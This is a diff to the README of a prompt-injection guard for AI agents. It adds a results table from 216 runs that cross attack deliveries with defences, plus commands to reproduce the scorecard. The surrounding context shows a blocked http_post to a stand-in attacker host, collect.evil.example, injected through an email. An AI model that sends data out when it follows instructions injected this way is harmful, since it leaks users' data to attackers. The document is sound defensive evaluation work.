@@ -81,6 +81,29 @@ BLOCK http_post(url='https://collect.evil.example/u', ...)
       The url 'collect.evil.example' came from email #5 from hr@corp.example, not from you.
 ```
 
+## What it measures
+
+216 runs: 8 ordinary tasks crossed with 8 attack deliveries, each under three
+defences. The agent is a deterministic stand-in that obeys every instruction it
+can actually see, so what is measured is the guard's own property rather than
+how gullible a particular model is on a particular day. It reads only what the
+guard let through, so muffling genuinely stops it.
+
+| Defence | Data reached the attacker | The agent tried | Stopped when it tried | Ordinary tasks finished |
+| --- | --- | --- | --- | --- |
+| No guard | 100% (64/64) | 100% (64/64) | 0% (0/64) | 100% (8/8) |
+| Policy engine only | **0%** (0/64) | 100% (64/64) | **100%** (64/64) | 100% (8/8) |
+| Policy engine and muffling | **0%** (0/64) | 50% (32/64) | **100%** (32/32) | 100% (8/8) |
+
+The middle row is the claim: with every content defence switched off, the
+policy engine refused all 64 attempts and nothing reached the attacker.
+Muffling then halves the attempts, because the instruction is gone before the
+agent reads it. Ranges on the page are 95% Wilson intervals.
+
+Reproduce it with `python -m evaluation.run --adversary`, which costs nothing.
+`python -m evaluation.run` runs the same suite against a real model instead;
+that needs credit on the configured provider.
+
 ## What is not claimed
 
 - The audit log is tamper-**evident**, not tamper-proof: anyone who can write
@@ -93,7 +116,11 @@ BLOCK http_post(url='https://collect.evil.example/u', ...)
 - An address the user pastes into their own request is trusted, because they
   chose it.
 - Detection thresholds are not yet tuned: "please ignore my last email" is
-  currently flagged. Measured on held-out data in the next phase.
+  currently flagged. The scorecard's three conditions do not include the
+  classifiers, so no claim is made about them.
+- The headline numbers use a deterministic worst-case agent, not a model. How
+  often a real model acts on one of these injections is a property of that
+  model; the Attack Lab demonstrates it live on openai/gpt-4o-mini.
 - The egress checks are heuristics. They catch known secret formats and copied
   runs of three or more meaningful words, but not every encoding or paraphrase.
 
